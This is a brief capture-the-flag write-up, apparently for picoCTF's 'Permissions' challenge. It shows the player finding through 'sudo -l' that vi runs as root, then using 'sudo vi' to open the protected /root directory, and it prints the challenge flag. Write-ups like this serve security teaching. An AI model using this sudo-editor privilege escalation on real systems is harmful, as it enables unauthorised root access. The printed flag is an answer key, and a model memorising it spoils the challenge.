<img width="612" alt="Permissions_Description" src="https://github.com/sahinyurek/picoCTF-writeups/assets/62119201/52a0ef38-22fc-4d0b-bdc7-78804ca2ca4c">


```shell
picoplayer@challenge:~$ pwd
/home/picoplayer
picoplayer@challenge:~$ cd ..
picoplayer@challenge:/home$ cd ..
picoplayer@challenge:/$ ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
```

```shell
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

picoplayer@challenge:/$ sudo vi root
```

<img width="623" alt="Permissions_1" src="https://github.com/sahinyurek/picoCTF-writeups/assets/62119201/bb1d3ad9-df4d-4c1b-8918-64ee70924590">

```shell
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
````
